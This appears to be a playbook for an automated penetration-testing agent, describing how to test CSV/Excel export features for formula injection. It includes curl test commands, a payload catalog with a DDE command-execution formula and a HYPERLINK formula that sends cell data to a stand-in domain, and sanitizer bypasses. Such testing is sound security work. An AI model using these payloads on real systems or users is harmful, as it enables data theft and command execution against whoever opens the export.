---
name: csv_formula_injection
agent: agent5_injection
description: Formula injection in CSV/Excel exports — payload placement across cells, delimiter/encoding differentials, and DDE/remote-content vectors.
---

# CSV Formula Injection

## Purpose

Finds formula injection in every export/download feature: "export to CSV," reports, user lists, activity logs, any admin download. When a victim opens the CSV in Excel/LibreOffice, a cell starting with `=`, `+`, `-`, or `@` executes as a formula — enabling data theft from the victim's spreadsheet (`HYPERLINK` exfiltration), command execution via DDE (`=cmd|' /c calc'!A0` — do NOT execute, document only), and phishing via crafted cell content. Missed because testers never download their own exports. Real impact: compromise of the admin/analyst who opens the export — the highest-privilege user.

## Division of labor

- **Consumes:** export/download endpoint inventory from `agent2_mapping`, field inventory of user-controlled values that appear in exports (names, emails, addresses, comments).
- **Produces:** `findings/csv_formula_injection.md` — per-export verdict table with payload placement and observed CSV encoding. Finished artifact.

## When to use / when NOT to use

- **Use when:** any CSV/XLS/XLSX export contains user-controlled data; admin panels with "download report"; data tables with export buttons; API endpoints returning `text/csv`.
- **Skip when (time-pass filter):** exports contain zero user-controlled fields (verify by exporting and reading the header + one row — don't assume); the export is PDF-only with no CSV/Excel path; the app strips or quotes leading `=+-@` (verify with the canary, don't assume — but if the canary comes back sanitized twice, stop).

## Methodology

1. **Inventory exports.** List every export endpoint + the user-controlled fields that flow into it. Submit canary values (`CSVTEST9q`) in each field, export, and confirm the canary appears in the download — this maps field → column.
2. **Baseline the export.** Download a clean export. Record: delimiter (`,`/`;`/tab), quoting style, BOM presence, line endings, Content-Type and Content-Disposition headers. The sanitization check in step 5 diffs against this.
3. **Classic formula canary.** Set a field to `=7*7` and export. Open the raw CSV (never in Excel — `cat`/hexdump only). If the cell contains the literal `=7*7` unquoted, the formula will evaluate on open = CONFIRMED at the syntax level. If it contains `"=7*7"` (quoted) or `'=7*7`, test whether the app consistently quotes — inconsistent quoting across columns is still a finding.
4. **Trigger-character sweep.** Test each trigger independently: `=`, `+`, `-`, `@`, plus `=cmd`, `|`, tab/CR/LF inside fields. Some sanitizers strip `=` but forget `+`/`-`/`@` (Excel treats all four as formula triggers).
5. **Sanitization differential.** For each trigger, compare the raw CSV cell against the submitted value. Document exactly what the sanitizer does: strips, quotes, prefixes with `'`, HTML-encodes, or nothing. A sanitizer that handles `=` but not `@` = bypass CONFIRMED.
6. **DDE vector (document, do not execute).** `=cmd|' /c calc'!A0` in a cell — if it lands unquoted in the CSV, note DDE command-execution potential. Do NOT craft a working calc payload against a live target; the unquoted `=cmd|` shape is the evidence.
7. **HYPERLINK exfiltration shape.** `=HYPERLINK("https://<YOUR_DOMAIN>/?c="%26A1,"click")` — document the shape that would exfiltrate cell A1 when clicked. Do not send it to a victim; the unquoted formula in the export is the finding.
8. **Multi-line / delimiter break.** Inject `\n=7*7` and `",=7*7,"` to break out of quoted cells — if the export quotes `=7*7` but your newline escapes the quoting, the sanitizer is bypassed. Check the raw bytes.
9. **Encoding tricks.** If the app strips ASCII `=`, try fullwidth `＝` (U+FF1D) — Excel normalizes some variants. Log the response; only count it if the raw CSV shows the variant unquoted.
10. **XLSX path.** If exports are `.xlsx`, unzip and inspect `xl/worksheets/sheet1.xml` — check whether the value sits in `<v>` (evaluated) vs `<t>` shared string with sanitization. Same verdict rules on the raw XML.
11. **Second-order via import.** If the app also IMPORTS csv (bulk upload), test whether imported formulas render unescaped in the UI or re-export — import→export chains double the impact.
12. **Verdict per export.** CONFIRMED = unquoted trigger character from your input present in the raw export bytes. Document the exact column and payload.

## Exact commands

Canary field→column mapping:
```bash
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d '{"name":"CSVTEST9q"}' -b 'session=<COOKIE>' -o /dev/null
curl -s '<TARGET>/api/admin/export/users.csv' -b 'session=<ADMIN_COOKIE>' -o export.csv
head -3 export.csv | grep -a -o 'CSVTEST9q' | head -2
```

Baseline the export format:
```bash
file export.csv; head -c 200 export.csv | xxd | head -5
curl -sI '<TARGET>/api/admin/export/users.csv' -b 'session=<ADMIN_COOKIE>' | grep -i 'content-'
```

Formula canary (raw bytes only — never open in Excel):
```bash
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d '{"name":"=7*7"}' -b 'session=<COOKIE>' -o /dev/null
curl -s '<TARGET>/api/admin/export/users.csv' -b 'session=<ADMIN_COOKIE>' -o exp2.csv
grep -a -o '"\?=7\*7' exp2.csv | head -3; echo '--- raw cell bytes: ---'
grep -a '7\*7' exp2.csv | head -2 | xxd | head -8
```

Trigger-character sweep:
```bash
for t in '=HYPERLINKTEST' '+SUMTEST' '-SUMTEST' '@SUMTEST' '=cmd|TEST'; do
  curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d "{\"name\":\"$t\"}" -b 'session=<COOKIE>' -o /dev/null
done
curl -s '<TARGET>/api/admin/export/users.csv' -b 'session=<ADMIN_COOKIE>' -o exp3.csv
grep -a -o -E '["'"'"']?[=+\-@][A-Z]*TEST' exp3.csv | sort | uniq -c
```

Newline breakout:
```bash
python3 -c "import json; print(json.dumps({'name':'x\n=7*7'}))" > nl.json
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d @nl.json -b 'session=<COOKIE>' -o /dev/null
curl -s '<TARGET>/api/admin/export/users.csv' -b 'session=<ADMIN_COOKIE>' | grep -a -A1 -B1 '7\*7' | head -10
```

XLSX raw inspection:
```bash
curl -s '<TARGET>/api/admin/export/users.xlsx' -b 'session=<ADMIN_COOKIE>' -o exp.xlsx
mkdir -p xlsx && cd xlsx && unzip -o -q ../exp.xlsx
grep -a -o '<c[^>]*><v>[^<]*7\*7[^<]*</v>' xl/worksheets/sheet1.xml | head -3
grep -a -o '<t>[^<]*=7\*7[^<]*</t>' xl/sharedStrings.xml | head -3; cd ..
```

## Payload catalog and app differences

**Per-trigger canary set (one field, one export, one trigger at a time):**
- `=7*7` — the universal canary; evaluates to 49 in Excel, LibreOffice, Google Sheets
- `+7*7` — Excel evaluates; some sanitizers only strip `=`
- `-7*7` — Excel evaluates as formula; also the "negative number" disguise
- `@7*7` — Excel treats `@` as implicit-intersection/formula trigger in newer versions
- `=1+1` — minimal; use when field length is capped
- `=HYPERLINK("https://<YOUR_DOMAIN>/x","click me")` — exfiltration shape (document only)
- `=cmd|' /c calc'!A0` — DDE shape (document only, never execute)

**Excel vs LibreOffice vs Google Sheets:**
- Excel: all four triggers (`=+-@`) evaluate; DDE executes with a warning prompt
- LibreOffice: `=` evaluates; `@` handling differs by version — test the canary, don't assume
- Google Sheets: formulas evaluate on import; `=HYPERLINK` exfiltration works without a warning
- The victim's app is unknown — a payload that fires in ANY of the three counts as CONFIRMED

**Sanitizer behaviors seen in the wild (classify what you observe):**
1. Nothing (raw `=7*7` in bytes) — CONFIRMED, worst case
2. Single-quote prefix (`'=7*7`) — safe in Excel, but verify the quote survives a re-export round-trip
3. Double-quote wrapping (`"=7*7"`) — safe ONLY if the quoting is consistent; your newline-breakout test (step 8) defeats inconsistent quoting
4. Leading-space/tab prefix (` =7*7`) — Excel TRIMS leading whitespace in some paste paths; verify in raw bytes AND note the trim risk
5. Backslash-escape (`\=7*7`) — the backslash renders literally; safe, but ugly — note it

**Tab-separated (TSV) exports:** same triggers apply — check the Content-Type; TSV with `=7*7` in a tab-delimited cell is equally vulnerable.

## Completion-bias defenses

- [ ] Every export endpoint inventoried and downloaded
- [ ] Field→column mapping confirmed with canary values before payloads
- [ ] Raw bytes inspected (xxd) — never opened in a spreadsheet app
- [ ] All four triggers (`=`, `+`, `-`, `@`) tested independently
- [ ] Sanitizer behavior documented per trigger (strip/quote/prefix/nothing)
- [ ] Newline/delimiter breakout attempted against quoted cells
- [ ] DDE shape documented, never executed
- [ ] XLSX path inspected at the XML level where applicable
- [ ] Import→export second-order checked where the app imports CSV
- [ ] `findings/csv_formula_injection.md` exists with verdict table
- **Review step:** agent10_review must verify (a) the raw export bytes showing the unquoted trigger are saved, (b) no spreadsheet application was used to open payloads, (c) no DDE payload was executed.
- **Nudge prompts:**
  - "Keep going until all four trigger characters are tested in every user-controlled column — the sanitizer that strips `=` often forgets `@`."
  - "Read the raw bytes. A cell that looks safe in a viewer may be unquoted in the file."
  - "Do not report done before findings/csv_formula_injection.md exists on disk."
- **Finished artifact definition:** `findings/csv_formula_injection.md` — per-export table (endpoint, columns, triggers tested, sanitizer behavior, verdict) + raw CSV excerpts (sanitized display, never executed).

## Evidence standard

- Baseline: clean export saved (format, quoting, headers) before payloads.
- Reproduction: unquoted trigger present in 2x fresh exports.
- Raw evidence: the export file bytes (or excerpt) showing the unquoted formula cell; the xxd dump for quoting disputes.
- Verdicts: CONFIRMED (unquoted trigger from your input in raw bytes, 2x) / INCONCLUSIVE (quoting inconsistent across runs) / NEGATIVE (all triggers stripped/quoted consistently, 2x).

## Handoffs

- `agent9_chaining`: consumes CONFIRMED rows — the victim is the admin/analyst; chains into session theft or internal phishing with human approval (no payload sent to real victims autonomously).
- `agent2_mapping`: receives the field→column map for the data model.
- `agent10_review`: consumes `findings/csv_formula_injection.md` — verifies raw-byte evidence and no-execution rule.
